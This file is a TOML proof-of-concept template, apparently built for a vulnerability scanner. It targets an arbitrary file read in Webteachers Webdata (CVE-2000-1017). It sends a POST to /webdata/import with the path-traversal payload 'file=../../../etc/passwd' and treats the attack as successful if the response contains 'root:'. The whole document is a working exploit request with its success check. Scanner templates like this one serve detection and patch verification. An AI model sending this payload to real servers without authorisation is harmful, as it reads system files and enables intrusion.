[info]
author = "ave"
description = "通过向 Webdata import 功能发送特制 POST 请求，利用路径遍历读取服务器任意文件"
id = "POC-AVE-2000-1051"
name = "Webteachers Webdata 任意文件读取漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1051"]
vuln_id = [
    "CVE-2000-1017",
    "AVE-2000-1051",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/webdata/import"
protocol = "http"

[poc.requests.body]
content = "file=../../../etc/passwd&import=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
